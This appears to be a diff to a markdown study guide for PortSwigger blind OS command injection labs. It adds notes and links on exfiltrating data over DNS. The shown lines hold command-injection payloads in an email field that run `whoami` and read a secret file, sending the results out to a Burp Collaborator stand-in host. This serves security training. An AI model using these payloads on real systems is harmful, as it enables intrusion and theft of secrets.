@@ -3237,12 +3237,18 @@ echo $cookie;
 email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 ```  
 
+>The below payload use DNS exfiltration and the Burp Collaborator DNS service.  
+
 ```
 ||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||
 ```  
 
+>In this youTube video [Leet Cipher](https://youtu.be/o7oVWXw4t5E) show how to use blind command injection to exfiltration the contents of `passwd` from the target by first uploading bash script that Base64 and then Base58 encode the `passwd` file content, to strip special character not able to ex-filtrate with DNS label restrictions.  
+
 ![OS command injection](images/os-command-inject.png)  
 
+[leetCipher Github scripts for Blind OS DNS exfiltrate](https://github.com/leetCipher/bug-bounty-labs/tree/main/dns-exfiltration-lab/poc)  
+  
 [PortSwigger Lab: Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)  
   
 ### Output redirection  
